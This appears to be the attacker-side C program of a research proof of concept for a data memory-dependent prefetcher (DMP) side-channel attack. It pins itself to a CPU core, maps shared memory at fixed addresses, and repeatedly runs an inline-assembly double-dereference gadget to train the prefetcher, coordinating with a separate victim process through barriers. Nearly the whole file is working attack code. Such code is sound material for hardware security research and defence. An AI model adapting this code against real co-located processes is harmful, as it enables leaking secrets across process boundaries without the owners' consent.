#include "../util/util.h"
#include <sys/mman.h>
#include "dmp_shared.h"

/* Gen macros */
#define PAGESIZE (4096)

#define CORE_TRAIN 7 //use core 6 if on i9

/* double deref gadget (from access_size_fix_2.c / fixed.c) */
__attribute__((aligned(1024), noinline))
uint64_t access_aop(uint64_t *aop, uint64_t size, uint64_t consumer_load_bit, uint64_t __trash) {
    asm volatile(
        "xor %%r12, %%r12\n"
        "xor %%r13, %%r13\n"
        "xor %%rbx, %%rbx\n"
        "mov %1, %%r11\n"

        "1:\n"
        "mov (%%r11, %%r12, 8), %%rax\n"
        "cmp $1, %4\n"
        "jne 2f\n"
        "mfence\n" // spec barrier
        "or (%%rax), %0\n"

        "2:\n"
        "add $1, %%r12\n"
        "add $1, %%r13\n"
        "cmp %3, %%r13\n"

        "jl 1b\n"
        : "=r" (__trash)
        : "r" (aop), "0" (__trash), "r" (size), "r" (consumer_load_bit)
        : "cc", "r11", "r12", "r13", "rax", "rbx"
    );
    return __trash & MSB_MASK;
}

int main(int argc, char **argv) {

    if(argc != 2) {
        fprintf(stderr, "Error Usage: ./attack.out <training size>\n");
        exit(1);
    }

    uint64_t training_size = atoi(argv[1]);
    assert(training_size + 1 <= MAX_TRAINING_SIZE); // shared training_aop is fixed-size

    /* shared control/barrier region; training_aop/buffer are shared below */
    void *base = shm_create();
    control_t *c = CTRL_ADDY(base);

    /* init */
    uint64_t __trash = 0;
    pin_cpu(CORE_TRAIN);
    __trash = c_sleep(3000, __trash);
    _mm_mfence();

    /* SHARED training aop + buffer, mapped at fixed VAs (attacker creates + fills) */
    uint64_t buffer_size = BUFFER_SIZE;
    uint64_t *training_buffer = (uint64_t *) shm_map_fixed(TRAIN_BUF_NAME, (void*)TRAIN_BUF_ADDR, TRAIN_BUF_BYTES, 1);
    for(uint64_t i = 0; i < buffer_size * 8; i+=8)
        training_buffer[i] = rand();
    uint64_t **training_aop = (uint64_t **) shm_map_fixed(TRAIN_AOP_NAME, (void*)TRAIN_AOP_ADDR, TRAIN_AOP_BYTES, 1);
    assert((uint64_t)training_aop % MB(2) == 0); // align to 2 MB
    for(int i = 0; i < training_size + 1; i++)
        training_aop[i] = &training_buffer[(rand() % buffer_size) * 8];

    /* keep private allocations away from the shared/fixed regions */
    volatile uint64_t *guard_page = malloc(MB(2) * sizeof(uint64_t));
    for(int i = 0; i < MB(2); i += 4096)
        guard_page[i] = rand();

    volatile uint64_t *ptr_under_test = ptr_create();

    /* data ready -> let the victim proceed */
    __atomic_store_n(&c->ready, 1, __ATOMIC_SEQ_CST);

    /* Phase 1: barrier smoke-test (match the victim's bar_wait count) */
    { int mine = 0;
        for(int k = 0; k < SYNC_ROUNDS; k++) {
            bar_wait(c, &mine);
            bar_wait(c, &mine);
        }
    }

    /* Calm down */
    sleep(0);

    /* Phase 2: attacker ONLY trains the DMP on the shared training_aop.
       The victim owns test_aop + ptr_under_test and does the trigger + detect. */
    int mine = 0;
    for(int i = 0; i < TRIALS * 2; i++) {
        _mm_mfence();

        bar_wait(c, &mine); //wait for victim to setup

        //do training
        __trash = access_aop(training_aop, training_size, 1, __trash);
        _mm_mfence();

        bar_wait(c, &mine); // trained, victim go
        bar_wait(c, &mine); // victim done
    }

    shm_unlink(SHM_NAME);
    shm_unlink(TRAIN_BUF_NAME);
    shm_unlink(TRAIN_AOP_NAME);
    shm_unlink(PTR_SHM_NAME);
    return 0;
}